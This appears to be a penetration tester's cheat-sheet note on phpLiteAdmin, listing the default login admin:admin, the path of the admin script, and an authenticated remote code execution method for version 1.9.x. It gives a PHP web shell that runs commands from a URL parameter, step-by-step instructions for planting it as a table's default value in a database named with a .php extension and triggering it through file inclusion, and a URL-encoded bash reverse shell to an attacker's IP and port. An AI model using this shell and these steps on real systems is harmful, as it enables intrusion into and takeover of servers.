# phpliteadmin

## Default Creds

```
admin:admin
```

## Interesting Paths

```bash
/db/phpliteadmin.php
```

## v1.9.x RCE (Authenticated)

```
https://www.exploit-db.com/exploits/24044
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>

1. create db kashz.php
2. note path to run it later.
3. create table kashz with 1 field
4. field name: shell | field type: TEXT | default value: shellcode
5. use LFI to run kashz.php&cmd=id

# need to url encode the rev shell.
bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/IP/PORT%200%3E%261%27
```
